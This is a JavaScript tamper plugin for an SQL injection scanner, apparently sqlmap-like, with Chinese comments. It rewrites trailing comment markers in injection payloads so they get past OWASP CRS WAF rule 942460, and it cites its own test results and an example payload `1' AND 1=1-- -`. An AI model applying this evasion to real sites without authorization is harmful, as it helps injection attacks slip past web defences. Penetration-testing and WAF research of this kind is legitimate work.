// 尾部注释规整：`-- -` → MySQL 系 `#` / 全方言通用 `-- `（尾空格）
// 背景（2026-09-09 waf-real 实测产出）：OWASP CRS v4.1.0 规则 942460（Meta-Character Anomaly）
// 对「连续 4 个非单词字符」直接拦截 —— `-- -` 恰好是 4 连（`-`、`-`、空格、`-`），
// `/**/` 同样 4 连（这使 space2comment 在严格 CRS 下反而送人头）。
// [P3-FIX 2026-09-11] 方言感知双形态（修复 P3 发现的 HSQLDB 静默漏检）：
//   · dbms 已知为 MySQL 系（MySQL/MariaDB/TiDB）→ `#`：仅 1 个非词字符，
//     P2 waf-real A/B 实证形态（tamper off 2/5 → on 5/5）；
//   · 其余（含 dbms 未知）→ `-- `（尾空格）：dash+dash+space 仅 3 连，CRS 942460/942431
//     实测通过，且是 SQL92 标准行注释——H2/HSQLDB/Derby 三引擎桥实证语法合法
//     （P3 时 dbms 未知阶段统一产出 `#` 导致 HSQLDB 真假同构零检出，即本修复的靶点）。
// 实现说明：只处理**尾部**注释（$ 锚定），不扫描中间注释 —— 注入 payload 中间出现 `--`
// 的场景（如字符串字面量内）语义敏感，而尾部 `-- -` 在注入语义中必为注释终结符。
// 注意不能用引号状态机：注入 payload 的闭合前缀（如 `alice'`）常为奇数引号，
// 状态机会把整段尾部误判为「字符串内」导致漏转换（首版实测踩坑）。
// 对标 sqlmap 语义：与 space2hash（空格→#注释）互补，本插件只改注释符，不动其他内容。
export const dash2hash = {
  name: 'dash2hash',
  description: '尾部 -- - 注释规整：MySQL 系转 #、其余方言转 --（SQL92），绕过 942460（4 连非词字符）类规则',
  // 双形态后全方言安全（非 MySQL 系落到 SQL92 标准 `-- `），无需 dbms 门控告警
  // 标记安全：只替换尾部注释符，不触碰 __S__ / SQLISCANNER<N> 标记
  markerSafe: true,
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const src = String(payload ?? '');
    // 尾部 `--` + 任意注释尾缀（- / 空白）→ 方言感知替换
    // 例：`1' AND 1=1-- -` → MySQL 系 `1' AND 1=1#` / 其余 `1' AND 1=1-- `
    const m = src.match(/\s*--[\s\S]*$/);
    if (m && /--/.test(m[0])) {
      // 仅当 `--` 之后无引号（引号意味着可能不是纯注释尾巴）才替换
      const tail = m[0];
      if (!/['"`]/.test(tail)) {
        const base = src.slice(0, src.length - tail.length);
        const dbms = String((ctx && ctx.dbms) || '').toLowerCase();
        const mysqlFamily = dbms === 'mysql' || dbms === 'mariadb' || dbms === 'tidb';
        return mysqlFamily ? base + '#' : base + '-- ';
      }
    }
    // 已是 # / -- 注释尾部：原样返回（幂等）
    return src;
  },
};
export default dash2hash;
